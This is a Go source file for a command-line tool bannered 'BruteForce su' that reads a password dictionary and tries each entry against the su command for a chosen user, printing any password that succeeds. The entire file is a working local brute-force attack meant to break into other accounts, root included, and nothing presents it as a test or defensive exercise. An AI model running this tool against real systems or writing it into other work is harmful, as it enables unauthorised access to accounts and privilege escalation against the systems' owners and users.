package main

import (
	"bufio"
	"fmt"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
)

var (
	timeout = 1.0
	mu      sync.Mutex
)

const (
	escGreen = "\033[1;32m"
	escBlue  = "\033[1;34m"
	escReset = "\033[0m"
)

func printHelp(progname string) {
	fmt.Printf("Usage: %s user dictionary [timeout] ...\n"+
		"You must specify both the username and the dictionary file.\n"+
		"Optionally, you can specify a timeout in seconds (e.g., 0.1).\n", progname)
	os.Exit(1)
}

func printBanner() {
	fmt.Println(escBlue +
		"******************************" +
		"\n*       BruteForce su        *" +
		"\n******************************" +
		escReset)
}

func checkPass(password, user string, wg *sync.WaitGroup) {
	defer wg.Done()
	mu.Lock()
	defer mu.Unlock()

	cmd := exec.Command("su", user)
	r, w, err := os.Pipe()
	if err != nil {
		fmt.Println("Error creating pipe:", err)
		return
	}
	cmd.Stdin = r
	cmd.Stdout = nil
	cmd.Stderr, _ = os.OpenFile("/dev/null", os.O_WRONLY, 0)

	if err := cmd.Start(); err != nil {
		fmt.Println("Error starting command:", err)
		return
	}

	w.Write([]byte(password + "\n"))
	w.Close()

	done := make(chan error, 1)
	go func() {
		done <- cmd.Wait()
	}()

	select {
	case err := <-done:
		if err == nil {
			fmt.Printf("%sPassword found for user %s: %s%s\n",
				escGreen, user, password, escReset)
		}
	case <-time.After(time.Duration(timeout * float64(time.Second))):
		cmd.Process.Signal(syscall.SIGKILL)
	}
}

func bruteForce(dictionary, user string) {
	var wg sync.WaitGroup

	file, err := os.Open(dictionary)
	if err != nil {
		fmt.Println("Error opening file:", err)
		os.Exit(1)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		password := strings.TrimSpace(scanner.Text())
		fmt.Println("Trying password:", password)
		wg.Add(1)
		go checkPass(password, user, &wg)
	}
	wg.Wait()
}

func main() {
	if len(os.Args) < 3 {
		printHelp(os.Args[0])
	}

	printBanner()

	user := os.Args[1]
	dictionary := os.Args[2]

	if len(os.Args) >= 4 {
		val, err := strconv.ParseFloat(os.Args[3], 64)
		if err == nil && val > 0 {
			timeout = val
		} else {
			fmt.Println("Invalid timeout value. Using default: 1.0s")
		}
	}

	bruteForce(dictionary, user)
}
